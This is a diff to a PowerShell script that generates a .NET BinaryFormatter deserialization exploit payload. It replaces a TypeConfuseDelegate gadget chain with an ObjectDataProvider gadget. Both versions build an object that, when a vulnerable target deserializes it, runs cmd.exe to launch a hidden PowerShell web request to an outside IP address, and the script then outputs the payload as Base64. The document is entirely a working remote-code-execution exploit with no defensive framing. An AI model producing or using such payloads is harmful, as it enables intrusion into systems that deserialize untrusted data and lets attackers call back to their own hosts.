@@ -1,46 +1,12 @@
-# --- Configuration ---
-$targetUrl = "http://10.230.200.240:8080/"
-$command = "powershell.exe -NoP -NonI -W Hidden -C ""Invoke-WebRequest -Uri '$targetUrl' -UseBasicParsing"""
+$odp = New-Object System.Windows.Data.ObjectDataProvider
+$odp.MethodName = "Start"
+$odp.MethodParameters = New-Object System.Collections.ArrayList
+$odp.MethodParameters.Add("cmd.exe")
+$odp.MethodParameters.Add("/c powershell.exe -NoP -NonI -W Hidden -C ""Invoke-WebRequest -Uri 'http://10.230.200.240:8080/' -UseBasicParsing""")
+$odp.ObjectInstance = $null
 
-# --- Payload Construction ---
-Write-Host "[*] Building TypeConfuseDelegate payload..." -ForegroundColor Cyan
-
-# 1. Create a delegate that points to Process.Start
-$processStartInfoType = [System.Diagnostics.ProcessStartInfo]
-$processType = [System.Diagnostics.Process]
-$startMethod = $processType.GetMethod('Start', [Type[]]@($processStartInfoType))
-$startDelegate = [System.Delegate]::CreateDelegate([System.Func[System.Diagnostics.ProcessStartInfo, System.Diagnostics.Process]], $startMethod)
-
-# 2. Prepare the arguments for Process.Start
-$psi = New-Object System.Diagnostics.ProcessStartInfo
-$psi.FileName = "cmd.exe"
-$psi.Arguments = "/c $command"
-$psi.UseShellExecute = $false
-$psi.RedirectStandardOutput = $true
-
-# 3. Load the internal ComparisonComparer type using Reflection
-# This is the fix for the 'Unable to find type' error.
-$mscorlib = [System.Reflection.Assembly]::Load("mscorlib")
-$comparisonComparerType = $mscorlib.GetType("System.Collections.Generic.ComparisonComparer``1").MakeGenericType([int])
-
-# 4. Create an instance of ComparisonComparer with the malicious delegate
-$comparisonDelegateType = [System.Comparison[int]]
-$constructor = $comparisonComparerType.GetConstructor([Type[]]@($comparisonDelegateType))
-$comparisonComparer = $constructor.Invoke(@($startDelegate))
-
-# 5. Use reflection to overwrite the internal '_comparison' field
-# This binds our Process.Start delegate to the object.
-$delegateField = $comparisonComparerType.GetField('_comparison', [System.Reflection.BindingFlags]'NonPublic, Instance')
-$delegateField.SetValue($comparisonComparer, $startDelegate)
-
-# --- Serialization ---
-Write-Host "[*] Serializing object..." -ForegroundColor Cyan
 $formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
 $ms = New-Object System.IO.MemoryStream
-$formatter.Serialize($ms, $comparisonComparer)
-$payload = $ms.ToArray()
-
-# Output the payload as a Base64 string
-$base64Payload = [Convert]::ToBase64String($payload)
-Write-Host "[+] Payload generated successfully!" -ForegroundColor Green
+$formatter.Serialize($ms, $odp)
+$base64Payload = [Convert]::ToBase64String($ms.ToArray())
 Write-Host "Base64 Payload: $base64Payload"
